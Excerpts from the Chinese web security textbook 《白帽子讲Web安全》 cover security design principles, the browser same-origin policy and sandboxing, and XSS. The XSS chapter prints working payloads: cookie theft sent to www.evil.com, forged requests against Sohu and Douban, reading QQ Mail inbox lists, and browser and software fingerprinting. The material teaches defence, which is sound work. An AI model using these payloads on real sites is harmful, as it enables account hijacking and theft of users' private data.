### 白帽子讲Web安全

吴翰清



<hr />

## 1.5 安全三要素

安全三要素是安全的基本组成元素，分别是机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。




<hr />
### 1.6.4 设计安全方案





很多人认为，安全和业务是冲突的，因为往往为了安全，要牺牲业务的一些易用性或者性能，笔者不太赞同这种观点。从产品的角度来说，安全也应该是产品的一种属性。



产品需求，尤其是商业需求，是用户真正想要的东西，是业务的意义所在，在设计安全方案时应该尽可能地不要改变商业需求的初衷。
注: 在设计安全方案时应尽可能地不要改变商业需求的初衷



每当系统里的软件有什么敏感动作时，UAC就会弹出来询问用户是否允许该行为。这个功能在Vista众多失败的原因中是被人诟病最多的一个。如果用户能够分辨什么样的行为是安全的，那么还要安全软件做什么？同样的问题出现在很多主动防御的桌面安全保护软件中，它们动辄弹出个对话框询问用户是否允许目标的行为，这是非常荒谬的用户体验。

<hr />
### 1.7.1 `Secure By Default`原则



这个规范的制定，也可以选择白名单的思想来实现。按照白名单的思想，应该根据业务需求，列出一个允许使用的软件以及软件版本的清单，在此清单外的软件则禁止使用。



通配符`*`，代表来自任意域的Flash都能访问本域的数据，因此就造成了安全隐患。所以在选择使用白名单时，需要注意避免出现类似通配符`*`的问题。



最小权限原则也是安全设计的基本原则之一。最小权限原则要求系统只授予主体必要的权限，而不要过度授权，这样能有效地减少系统、网络、应用、数据库出错的机会。

<hr />
### 1.7.2 纵深防御原则



常见的入侵案例中，大多数是利用Web应用的漏洞，攻击者先获得一个低权限的webshell，然后通过低权限的webshell上传更多的文件，并尝试执行更高权限的系统命令，尝试在服务器上提升权限为root；接下来攻击者再进一步尝试渗透内网，比如数据库服务器所在的网段。



对于XSS防御，对系统取得的用户输入进行过滤其实是不太合适的，因为XSS真正产生危害的场景是在用户的浏览器上，或者说服务器端输出的HTML页面，被注入了恶意代码。只有在拼装HTML时输出，系统才能获得HTML上下文的语义，才能判断出是否存在误杀等情况。所以“在正确的地方做正确的事情”，也是纵深防御的一种含义——必须把防御方案放到最合适的地方去解决。（XSS防御的更多细节请参考“跨站脚本攻击”一章。


<hr />
### 1.7.3 数据与代码分离原则



实际上，缓冲区溢出，也可以认为是程序违背了这一原则的后果——程序在栈或者堆中，将用户数据当做代码执行，混淆了代码与数据的边界，从而导致安全问题的发生。



在Web安全中，由“注入”引起的问题比比皆是，如XSS、SQL Injection、CRLF Injection、X-Path Injection等。此类问题均可以根据“数据与代码分离原则”设计出真正安全的解决方案，因为这个原则抓住了漏洞形成的本质原因。

<hr />
### 1.7.4 不可预测性原则



微软的Windows系统用户多年来深受缓冲区溢出之苦，因此微软在Windows的新版本中增加了许多对抗缓冲区溢出等内存攻击的功能。微软无法要求运行在系统中的软件没有漏洞，因此它采取的做法是让漏洞的攻击方法失效。比如，使用DEP来保证堆栈不可执行，使用ASLR让进程的栈基址随机变化，从而使攻击程序无法准确地猜测到内存地址，大大提高了攻击的门槛。



在ASLR的控制下，一个程序每次启动时，其进程的栈基址都不相同，具有一定的随机性，对于攻击者来说，这就是“不可预测性”

<hr />

### 2.1 同源策略



同源策略（Same Origin Policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略的基础之上的，浏览器只是针对同源策略的一种实现。



浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。


这一策略极其重要，试想如果没有同源策略，可能a.com的一段JavaScript脚本，在b.com未曾加载此脚本时，也可以随意涂改b.com的页面（在浏览器的显示中）。为了不让浏览器的页面行为发生混乱，浏览器提出了“Origin”（源）这一概念，来自不同Origin的对象无法互相干扰


浏览器中JavaScript的同源策略（当JavaScript被浏览器认为来自不同源时，请求被拒绝）


影响“源”的因素有：host（域名或IP地址，如果是IP地址则看做一个根域名）、子域名、端口、协议。


需要注意的是，对于当前页面来说，页面内存放JavaScript文件的域并不重要，重要的是加载JavaScript页面所在的域是什么。


换言之，a.com通过以下代码：


```
<script src=http://b.com/b.js ></script>

```

加载了b.com上的b.js，但是b.js是运行在a.com页面中的，因此对于当前打开的页面（a.com页面）来说，b.js的Origin就应该是a.com而非b.com。


在浏览器中，`<script>、<img>、<iframe>、<link>`等标签都可以跨域加载资源，而不受同源策略的限制。这些带“src”属性的标签每次加载时，实际上是由浏览器发起了一次GET请求。不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。


但XMLHttpRequest受到同源策略的约束，不能跨域访问资源，在AJAX应用的开发中尤其需要注意这一点。


如果XMLHttpRequest能够跨域访问资源，则可能会导致一些敏感数据泄露，比如CSRF的token，从而导致发生安全问题。


但是互联网是开放的，随着业务的发展，跨域请求的需求越来越迫切，因此W3C委员会制定了XMLHttpRequest跨域访问标准。它需要通过目标域返回的HTTP头来授权是否允许跨域访问，因为HTTP头对于JavaScript来说一般是无法控制的，所以认为这个方案可以实施。注意：这个跨域访问方案的安全基础就是信任“JavaScript无法控制该HTTP头”，如果此信任基础被打破，则此方案也将不再安全。


对于浏览器来说，除了DOM、Cookie、XMLHttpRequest会受到同源策略的限制外，浏览器加载的一些第三方插件也有各自的同源策略。最常见的一些插件如Flash、Java Applet、Silverlight、Google Gears等都有自己的控制策略。


以Flash为例，它主要通过目标网站提供的crossdomain.xml文件判断是否允许当前“源”的Flash跨域访问目标资源。
以www.qq.com的策略文件为例，当浏览器在任意其他域的页面里加载了Flash后，如果对www.qq.com发起访问请求，Flash会先检查www.qq.com上此策略文件是否存在。如果文件存在，则检查发起请求的域是否在许可范围内。


在这个策略文件中，只有来自`*.qq.com`和 `*.gtimg.com`域的请求是被允许的。依靠这种方式，从Origin的层面上控制了Flash行为的安全性。


浏览器的同源策略是浏览器安全的基础，在本书后续章节中提到的许多客户端脚本攻击，都需要遵守这一法则，因此理解同源策略对于客户端脚本攻击有着重要意义。同源策略一旦出现漏洞被绕过，也将带来非常严重的后果，很多基于同源策略制定的安全方案都将失去效果。


<hr />
### 2.2 浏览器沙箱

浏览器的多进程架构，将浏览器的各个功能模块分开，各个浏览器实例分开，当一个进程崩溃时，也不会影响到其他的进程。



Google Chrome是第一个采取多进程架构的浏览器。Google Chrome的主要进程分为：浏览器进程、渲染进程、插件进程、扩展进程。插件进程如flash、java、pdf等与浏览器进程严格隔离，因此不会互相影响。



渲染引擎由Sandbox隔离，网页代码要与浏览器内核进程通信、与操作系统通信都需要通过IPC channel，在其中会进行一些安全检查。



Sandbox即沙箱，计算机技术发展到今天，Sandbox已经成为泛指“资源隔离类模块”的代名词。Sandbox的设计目的一般是为了让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源。如果一定要跨越Sandbox边界产生数据交换，则只能通过指定的数据通道，比如经过封装的API来完成，在这些API中会严格检查请求的合法性。



Sandbox的应用范围非常广泛。比如一个提供hosting服务的共享主机环境，假设支持用户上传PHP、Python、Java等语言的代码，为了防止用户代码破坏系统环境，或者是不同用户之间的代码互相影响，则应该设计一个Sandbox对用户代码进行隔离。Sandbox需要考虑用户代码针对本地文件系统、内存、数据库、网络的可能请求，可以采用默认拒绝的策略，对于有需要的请求，则可以通过封装API的方式实现。



Google Chrome实现了一个相对完整的Sandbox：



IE 8也采取了多进程架构，每一个Tab页即是一个进程



多进程架构最明显的一个好处是，相对于单进程浏览器，在发生崩溃时，多进程浏览器只会崩溃当前的Tab页，而单进程浏览器则会崩溃整个浏览器进程。



但是浏览器安全是一个整体，在现今的浏览器中，虽然有多进程架构和Sandbox的保护，但是浏览器所加载的一些第三方插件却往往不受Sandbox管辖。比如近年来在Pwn2Own大会上被攻克的浏览器，往往都是由于加载的第三方插件出现安全漏洞导致的。Flash、Java、PDF、.Net Framework在近年来都成为浏览器攻击的热点。



也许在不远的未来，在浏览器的安全模型中会更加重视这些第三方插件，不同厂商之间会就安全达成一致的标准，也只有这样，才能将这个互联网的入口打造得更加牢固


<hr />
### 2.3 恶意网址拦截



上节提到了“挂马”攻击方式能够破坏浏览器安全，在很多时候，“挂马”攻击在实施时会在一个正常的网页中通过``<script>``或者``<iframe>``等标签加载一个恶意网址。



为了保护用户安全，浏览器厂商纷纷推出了各自的拦截恶意网址功能。目前各个浏览器的拦截恶意网址的功能都是基于“黑名单”的。



恶意网址拦截的工作原理很简单，一般都是浏览器周期性地从服务器端获取一份最新的恶意网址黑名单，如果用户上网时访问的网址存在于此黑名单中，浏览器就会弹出一个警告页面。



常见的恶意网址分为两类：一类是挂马网站，这些网站通常包含有恶意的脚本如JavaScript或Flash，通过利用浏览器的漏洞（包括一些插件、控件漏洞）执行shellcode，在用户电脑中植入木马；另一类是钓鱼网站，通过模仿知名网站的相似页面来欺骗用户。
要识别这两种网站，需要建立许多基于页面特征的模型，而这些模型显然是不适合放在客户端的，因为这会让攻击者得以分析、研究并绕过这些规则。同时对于用户基数巨大的浏览器来说，收集用户访问过的历史记录也是一种侵犯隐私的行为，且数据量过于庞大。
基于这两个原因，浏览器厂商目前只是以推送恶意网址黑名单为主，浏览器收到黑名单后，对用户访问的黑名单进行拦截；而很少直接从浏览器收集数据，或者在客户端建立模型。现在的浏览器多是与专业的安全厂商展开合作，由安全厂商或机构提供恶意网址黑名单。



一些有实力的浏览器厂商，比如Google和微软，由于本身技术研发实力较强，且又掌握了大量的用户数据，因此自建有安全团队做恶意网址识别工作，用以提供浏览器所使用的黑名单。对于搜索引擎来说，这份黑名单也是其核心竞争力之一。



PhishTank是互联网上免费提供恶意网址黑名单的组织之一，它的黑名单由世界各地的志愿者提供，且更新频繁。



类似地，Google也公开了其内部使用的SafeBrowsing API，任何组织或个人都可以在产品中接入，以获取Google的恶意网址库。



除了恶意网址黑名单拦截功能外，主流浏览器都开始支持EV SSL证书（Extended Validation SSL Certificate），以增强对安全网站的识别。
EVSSL证书是全球数字证书颁发机构与浏览器厂商一起打造的增强型证书，其主要特色是浏览器会给予EVSSL证书特殊待遇。EVSSL证书也遵循X509标准，并向前兼容普通证书。如果浏览器不支持EV模式，则会把该证书当做普通证书；如果浏览器支持（需要较新版本的浏览器）EV模式，则会在地址栏中特别标注。


<hr />
### 2.4 高速发展的浏览器安全



浏览器安全”领域涵盖的范围非常大，且今天浏览器仍然在不断更新，不断推出新的安全功能。
为了在安全领域获得竞争力，微软率先在IE 8中推出了XSS Filter功能，用以对抗反射型XSS。一直以来，XSS（跨站脚本攻击）都被认为是服务器端应用的漏洞，应该由服务器端应用在代码中修补，而微软率先推出了这一功能，就使得IE 8在安全领域极具特色。



当用户访问的URL中包含了XSS攻击的脚本时，IE就会修改其中的关键字符使得攻击无法成功完成，并对用户弹出提示框。



这些规则可以捕获URL中的XSS攻击，其他的安全产品可以借鉴。



而Firefox也不甘其后，在Firefox 4中推出了Content Security Policy（CSP）。这一策略是由安全专家Robert Hanson最早提出的，其做法是由服务器端返回一个HTTP头，并在其中描述页面应该遵守的安全策略。



由于XSS攻击在没有第三方插件帮助的情况下，无法控制HTTP头，所以这项措施是可行的。



使用CSP的方法如下，插入一个HTTP返回头：

`X-Content-Security-Policy: policy`

其中policy的描述极其灵活，比如：



CSP的设计理念无疑是出色的，但是CSP的规则配置较为复杂，在页面较多的情况下，很难一个个配置起来，且后期维护成本也非常巨大，这些原因导致CSP未能得到很好的推广。



比如，浏览器地址栏对于畸形URL的处理就各自不同。在IE中，如下URL将被正常解析：


```
www.google.com\abc
```

会变为


```
www.google.com/abc

```

具有同样行为的还有Chrome，将“\”变为标准的“/”。

但是Firefox却不如此解析，www.google.com\abc将被认为是非法的地址，无法打开。



扩展和插件的权限都高于页面JavaScript的权限，比如可以进行一些跨域网络请求等。



在插件中，也曾经出现过一些具有恶意功能的程序，比如代号为Trojan.PWS.ChromeInject.A的恶意插件，其目标是窃取网银密码

<hr />
### 2.5 小结



浏览器是互联网的重要入口，在安全攻防中，浏览器的作用也越来越被人们所重视。在以往研究攻防时，大家更重视的是服务器端漏洞；而在现在，安全研究的范围已经涵盖了所有用户使用互联网的方式，浏览器正是其中最为重要的一个部分。



浏览器的安全以同源策略为基础，加深理解同源策略，才能把握住浏览器安全的本质。在当前浏览器高速发展的形势下，恶意网址检测、插件安全等问题都会显得越来越重要。紧跟浏览器发展的脚步来研究浏览器安全，是安全研究者需要认真对待的事情。

<hr />
### 第3章　跨站脚本攻击（XSS）



跨站脚本攻击（XSS）是客户端脚本安全中的头号大敌。OWASP TOP 10威胁多次把XSS列在榜首。本章将深入探讨XSS攻击的原理，以及如何正确地防御它。

<hr />
### 3.1 XSS简介



XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。



XSS长期以来被列为客户端Web安全中的头号大敌。因为XSS破坏力强大，且产生的场景复杂，难以一次性解决。现在业内达成的共识是：针对各种不同场景产生的XSS，需要区分情景对待。即便如此，复杂的应用环境仍然是XSS滋生的温床。



XSS根据效果的不同可以分成如下几类。

第一种类型：`反射型XSS`


反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型XSS也叫做“非持久型XSS”（Non-persistent XSS）。


第二种类型：存储型XSS


存储型XSS会把用户输入的数据“存储”在服务器端。这种XSS具有很强的稳定性。
比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。黑客把恶意的脚本保存到服务器端，所以这种XSS攻击就叫做“存储型XSS”。
存储型XSS通常也叫做“持久型XSS”(Persistent XSS)，因为从效果上来说，它存在的时间是比较长的。


第三种类型：DOM Based XSS


实际上，这种类型的XSS并非按照“数据是否保存在服务器端”来划分，DOM Based XSS从效果上来说也是反射型XSS。单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。
通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。



看如下代码：


```
<script>

function test(){
  var str = document.getElementById("text").value;
  document.getElementById("t").innerHTML = "<a href='"+str+"' >testLink</a>";
}

</script>

<div id="t" ></div>
<input type="text" id="text" value="" />
<input type="button" id="s" value="write" onclick="test()" />

```

点击“write”按钮后，会在当前页面插入一个超链接，其地址为文本框的内容：
在这里，“write”按钮的onclick事件调用了test()函数。而在test()函数中，修改了页面的DOM节点，通过innerHTML把一段用户数据当做HTML写入到页面中，这就造成了DOM based XSS。



构造如下数据：

```
' onclick=alert(/xss/) //

```

输入后，页面代码就变成了：`<a  href='' onlick=alert(/xss/)//' >testLink</a>`

首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符“//”注释掉第二个单引号。



实际上，这里还有另外一种利用方式——除了构造一个新事件外，还可以选择闭合掉<a>标签，并插入一个新的HTML标签。尝试如下输入：


```
'><img src=# onerror=alert(/xss2/) /><'
页面代码变成了：
<a href=''><img src=# onerror=alert(/xss2/) /><'' >testLink</a>
脚本被执行：

```

<hr />
### 3.2.1 初探XSS Payload



XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为“XSS Payload”。



XSS Payload实际上就是JavaScript脚本（还可以是Flash或其他富客户端的脚本），所以任何JavaScript脚本能实现的功能，XSS Payload都能做到。
一个最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。
Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。



攻击者先加载一个远程脚本：


```
http://www.a.com/test.htm?abc="><script src=http://www.evil.com/evil.js ></script>


```

真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。



在evil.js中，可以通过如下代码窃取Cookie：

```
var img = document.createElement("img");
img.src = "http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);

```

这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。
事实上，`http://www.evil.com/log`并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录：

```
127.0.0.1 - - [19/Jul/2010:11:30:42 +0800] "GET /log?cookie1%3D1234 HTTP/1.1" 404 288

```

这样，就完成了一个最简单的窃取Cookie的XSS Payload。
如何利用窃取的Cookie登录目标用户的账户呢？这和“利用自定义Cookie访问网站”的过程是一样的，参考如下过程。

在Firefox中访问用户的百度空间，登录后查看当前的Cookie：
```
查看当前页面的Cookie值
然后打开IE，访问同一个页面。此时在IE中，用户是未登录状态：
用户处于未登录状态
将Firefox中登录后的Cookie记录下来，并以之替换当前IE中的Cookie。重新发送这个包：使用同一Cookie值重新发包
通过返回的页面可以看到，此时已经登录进该账户：返回登录后的状态页面
验证一下，把返回的HTML代码复制到本地打开后，可以看到右上角显示了账户信息相关的数据：
返回页面是已登录状态
```




所以，通过XSS攻击，可以完成“Cookie劫持”攻击，直接登录进用户的账户。

这是因为在当前的Web中，Cookie一般是用户登录的凭证，浏览器发起的所有请求都会自动带上Cookie。如果Cookie没有绑定客户端信息，当攻击者窃取了Cookie后，就可以不用密码登录进用户的账户。

Cookie的“HttpOnly”标识可以防止“Cookie劫持”


<hr />
### 3.2.2 强大的XSS Payload



“Cookie劫持”并非所有的时候都会有效。有的网站可能会在Set-Cookie时给关键Cookie植入HttpOnly标识；有的网站则可能会把Cookie与客户端IP绑定（相关内容在“XSS的防御”一节中会具体介绍），从而使得XSS窃取的Cookie失去意义。
尽管如此，在XSS攻击成功后，攻击者仍然有许多方式能够控制用户的浏览器。



构造GET与POST请求

一个网站的应用，只需要接受HTTP协议中的GET或POST请求，即可完成所有操作。对于攻击者来说，仅通过JavaScript，就可以让浏览器发起这两种请求。



假设Sohu博客所在域的某页面存在XSS漏洞，那么通过JavaScript，这个过程如下。

正常删除该文章的链接是：

```
http://blog.sohu.com/manage/entry.do?m=delete&id=156713012

```

对于攻击者来说，只需要知道文章的id，就能够通过这个请求删除这篇文章了。在本例中，文章的id是156713012。
攻击者可以通过插入一张图片来发起一个GET请求：


```
var img = document.createElement("img");
img.src = "http://blog.sohu.com/manage/entry.do?m=delete&id=156713012";
document.body.appendChild(img);

```

攻击者只需要让博客的作者执行这段JavaScript代码（XSS Payload），就会把这篇文章删除。在具体攻击中，攻击者将通过XSS诱使用户执行XSS Payload。



再看一个复杂点的例子。如果网站应用者接受POST请求，那么攻击者如何实施XSS攻击呢？

下例是Douban的一处表单。攻击者将通过JavaScript发出一个POST请求，提交此表单，最终发出一条新的消息。在正常情况下，发出一条消息，浏览器发的包是：
Douban上发新消息的请求包

要模拟这一过程，有两种方法。第一种方法是，构造一个form表单，然后自动提交这个表单：


```
var f = document.createElement("form");
f.action = "";
f.method = "post";
document.body.appendChild(f);

var i1 = document.createElement("input");
i1.name = " ck";
i1.value = " JiUY";
f.appendChild(i1);

var i2 = document.createElement("input");
i2.name = " mb_text";
i2.value = "testtesttest";
f.appendChild(i2);

f.submit();

```

如果表单的参数很多的话，通过构造DOM节点的方式，代码将会非常冗长。所以可以直接写HTML代码，这样会使得整个代码精简很多，如下所示：var dd = document.createElement("div");


```
document.body.appendChild(dd);
dd.innerHTML = '<form action="" method="post" id="xssform" name="mbform">'+
'<input type="hidden" value="JiUY" name="ck" />'+
'<input type="text" value="testtesttest" name="mb_text" />'+
'</form>'

document.getElementById("xssform").submit();

```

自动提交表单成功：
通过表单自动提交发消息成功

第二种方法是，通过XMLHttpRequest发送一个POST请求：


```
var url = "http://www.douban.com";
var postStr = "ck=JiUY&mb_text=test1234";
var ajax = null;
if(window.XMLHttpRequest){
    ajax = new XMLHttpRequest();
   }
else if(window.ActiveXObject){
    ajax = new ActiveXObject("Microsoft.XMLHTTP");
   }
else{
    return;
   }

ajax.open("POST", url, true);
ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
ajax.send(postStr);

ajax.onreadystatechange = function(){
    if (ajax.readyState == 4 && ajax.status == 200){
           alert("Done!");
        }
  }

```

再次提交成功：
通过XMLHttpRequest发消息成功
通过这个例子可以清楚地看到，使用JavaScript模拟浏览器发包并不是一件困难的事情。
所以XSS攻击后，攻击者除了可以实施“Cookie劫持”外，还能够通过模拟GET、POST请求操作用户的浏览器。这在某些隔离环境中会非常有用，比如“Cookie劫持”失效时，或者目标用户的网络不能访问互联网等情况。



下面这个例子将演示如何通过XSS Payload读取QMail用户的邮件文件夹。
首先看看正常的请求是如何获取到所有的邮件列表的。登录邮箱后，可以看到：
QQ邮箱的界面

点击“收件箱”后，看到邮件列表。抓包发现浏览器发出了如下请求：


```
http://m57.mail.qq.com/cgi-bin/mail_list?sid=6alhx3p5yzh9a2om7U51dDyz&folderid=1&page
=0&s=inbox&loc=folderlist,,,1

```


QQ邮箱的邮件列表
经过分析发现，真正能访问到邮件列表的链接是：


```
http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&page=0&s=inbox&sid=6alhx3p5yzh9a2
om7U51dDyz

```

在Firebug中分析QQ邮箱的页面内容
这里有一个无法直接构造出的参数值：sid。从字面推测，这个sid参数应该是用户ID加密后的值。
所以，XSS Payload的思路是先获取到sid的值，然后构造完整的URL，并使用XMLHttpRequest请求此URL，应该就能得到邮件列表了。XSS Payload如下：


```
if (top.window.location.href.indexOf("sid=")>0){
  var sid = top.window.location.href.substr(top.window.location.href.indexOf("sid=")
+4,24);
}


var folder_url = "http://"+top.window.location.host+"/cgi-bin/mail_list?folderid=
1&page=0&s=inbox&sid="+sid;

var ajax = null;
if(window.XMLHttpRequest){
    ajax = new XMLHttpRequest();
   }
else if(window.ActiveXObject){
    ajax = new ActiveXObject("Microsoft.XMLHTTP");
   }
else{
    return;
   }

ajax.open("GET", folder_url, true);
ajax.send(null);

ajax.onreadystatechange = function(){
    if (ajax.readyState == 4 && ajax.status == 200){
           alert(ajax.responseText);
           //document.write(ajax.responseText)
        }
  }


```

执行这段代码后：
获取邮件内容
邮件列表的内容成功被XSS Payload获取到。
攻击者获取到邮件列表的内容后，还可以读取每封邮件的内容，并发送到远程服务器上。这只需要构造不同的GET或POST请求即可，在此不再赘述，有兴趣的读者可以自己通过JavaScript实现这个功能。



XSS并非万能。在前文的例子中，XSS的攻击过程都是在浏览器中通过JavaScript脚本自动进行的，也就是说，缺少“与用户交互”的过程。



比如在前文提到的“通过POST表单发消息”的案例中，如果在提交表单时要求用户输入验证码，那么一般的XSS Payload都会失效；此外，在大多数“修改用户密码”的功能中，在提交新密码前，都会要求用户输入“Old Password”。而这个“Old Password”，对于攻击者来说，往往是不知道的。
但是，这就能限制住XSS攻击吗？答案是否定的。
对于验证码，XSS Payload可以通过读取页面内容，将验证码的图片URL发送到远程服务器上来实施——攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。



修改密码的问题稍微复杂点。为了窃取密码，攻击者可以将XSS与“钓鱼”相结合。
实现思路很简单：利用JavaScript在当前页面上“画出”一个伪造的登录框，当用户在登录框中输入用户名与密码后，其密码将被发送至黑客的服务器上。
通过JavaScript伪造的登录框
充分发挥想象力，可以使得XSS攻击的威力更加巨大。



在很多时候，攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。XSS能够帮助攻击者快速达到收集信息的目的。
如何通过JavaScript脚本识别浏览器版本呢？最直接的莫过于通过XSS读取浏览器的UserAgent对象：alert(navigator.userAgent);



这个对象，告诉我们很多客户端的信息：
OS版本：Windows NT 5.1（这是Windows XP的内核版本）
浏览器版本：Firefox 3.6.7
系统语言：zh-CN（简体中文）
但是浏览器的UserAgent是可以伪造的。比如，Firefox有很多扩展可以屏蔽或自定义浏览器发送的UserAgent。所以通过JavaScript取出来的这个浏览器对象，信息并不一定准确。



但对于攻击者来说，还有另外一种技巧，可以更准确地识别用户的浏览器版本。
由于浏览器之间的实现存在差异——不同的浏览器会各自实现一些独特的功能，而同一个浏览器的不同版本之间也可能会有细微差别。所以通过分辨这些浏览器之间的差异，就能准确地判断出浏览器版本，而几乎不会误报。这种方法比读取UserAgent要准确得多。



```
if (window.ActiveXObject){ // MSIE 6.0 or below

//判断是否是IE 7以上
if (document.documentElement && typeof document.documentElement.style.maxHeight!=
"undefined" ){

    //判断是否是 IE 8+
    if ( typeof document.adoptNode != "undefined") { // Safari3 & FF & Opera & Chrome
& IE8
                     //MSIE 8.0  因为同时满足前两个if判断，所以//在这里是IE 8
    }
    // MSIE 7.0  否则就是IE 7
}
             return "msie";
}
else if (typeof window.opera != "undefined") { //Opera独占
// "Opera "+window.opera.version()
return "opera";
}
else if (typeof window.netscape != "undefined") { //Mozilla 独占
// "Mozilla"
// 可以准确识别大版本
if (typeof window.Iterator != "undefined") {
     // Firefox 2 以上支持这个对象

     if (typeof document.styleSheetSets != "undefined") { // Firefox 3 & Opera 9
         // Firefox 3  同时满足这些条件的必然是 Firefox 3了
     }
}
return "mozilla";
}
else if (typeof window.pageXOffset != "undefined") { // Mozilla & Safari
     //"Safari"
     try{
       if (typeof external.AddSearchProvider != "undefined") { // Firefox & Google Chrome
          //Google Chrome
          return "chrome";
       }
     } catch (e) {
         return "safari";
     }
}
else { //unknown
     //Unknown
     return "unknown";
}


```

这段代码，找到了几个浏览器独有的对象，能够识别浏览器的大版本。依据这个思路，还可以找到更多“独特的”浏览器对象。



安全研究者Gareth Heyes曾经找到一种更巧妙的方法，通过很精简的代码，即可识别出不同的浏览器。


```
//Firefox detector 2/3 by DoctorDan
FF=/a/[-1]=='a'
//Firefox 3 by me:-
FF3=(function x(){})[-5]=='x'
//Firefox 2 by me:-
FF2=(function x(){})[-6]=='x'
//IE detector I posted previously
IE='\v'=='v'
//Safari detector by me
Saf=/a/.__proto__=='//'
//Chrome by me
Chr=/source/.test((/a/.toString+''))
//Opera by me
Op=/^function \(/.test([].sort)
//IE6 detector using conditionals
try {IE6=@cc_on @_jscript_version <= 5.7&&@_jscript_build<10000
精简为一行代码，即：
B=(function x(){})[-5]=='x'?'FF3':(function
x(){})[-6]=='x'?'FF2':/a/[-1]=='a'?'FF':'\v'=='v'?'IE':/a/.__proto__=='//'?'Saf':/s/.
test(/a/.toString)?'Chr':/^function \(/.test([].sort)?'Op':'Unknown'

```




知道了用户使用的浏览器、操作系统后，进一步可以识别用户安装的软件。
在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。这种方法很早就被用于“挂马攻击”——黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。
看如下代码：


```
try {
var Obj = new ActiveXObject(‘XunLeiBHO.ThunderIEHelper’);
} catch (e){
  // 异常了，不存在该控件
}


```

这段代码检测迅雷的一个控件（“XunLeiBHO.ThunderIEHelper”）是否存在。如果用户安装了迅雷软件，则默认也会安装此控件。因此通过判断此控件，即可推测用户安装了迅雷软件的可能性。

通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。

一些第三方软件也可能会泄露一些信息。比如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息：Flash的system.capabilities对象
在XSS Payload中使用时，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的JavaScript。这个过程在此不再赘述了。
浏览器的扩展和插件也能被XSS Payload扫描出来。比如对于Firefox的插件和扩展，有着不同的检测方法。
Firefox的插件（Plugins）列表存放在一个DOM对象中，通过查询DOM可以遍历出所有的插件：Firefox的plugins对象
所以直接查询“navigator.plugins”对象，就能找到所有的插件了。在上图中所示的插件是“navigator.plugins[0]”。



而Firefox的扩展（Extension）要复杂一些。有安全研究者想出了一个方法：通过检测扩展的图标，来判断某个特定的扩展是否存在。在Firefox中有一个特殊的协议：chrome://，Firefox的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问：
chrome://flashgot/skin/icon32.png
扫描Firefox扩展时，只需在JavaScript中加载这张图片，如果加载成功，则扩展存在；反之，扩展不存在。


```
var m = new Image();
  m.onload = function() {
    alert(1);
    //图片存在
  };
  m.onerror = function() {
    alert(2);
    //图片不存在
  };
  m.src = "chrome://flashgot/skin/icon32.png";  //连接图片


```

<hr />
#### 3.2.2.5　CSS History Hack

我们再看看另外一个有趣的XSS Payload——通过CSS，来发现一个用户曾经访问过的网站。
这个技巧最早被Jeremiah Grossman发现，其原理是利用style的visited属性——如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同：

```
<body>
 <a href=# >曾经访问过的</a>
 <a href="notexist" >未曾访问过的</a>
</body>

```

浏览器会将点击过的链接示以不同的颜色：
安全研究者Rsnake公布了一个POC，其效果如下：
Rsnake演示的攻击效果
红色标记的，就是用户曾经访问过的网站（即Visited下的两个网站）。
这个POC代码如下：


```
<script>
<!--
/*
NAME: JavaScript History Thief
AUTHOR: Jeremiah Grossman

BSD LICENSE:
Copyright (c) 2006, WhiteHat Security, Inc.
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:
* Redistributions of source code must retain the above copyright notice,
  this list of conditions and the following disclaimer.
* Redistributions in binary form must reproduce the above copyright notice,
  this list of conditions and the following disclaimer in the documentation
  and/or other materials provided with the distribution.
* Neither the name of the WhiteHat Security nor the names of its contributors
  may be used to endorse or promote products derived from this software
  without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
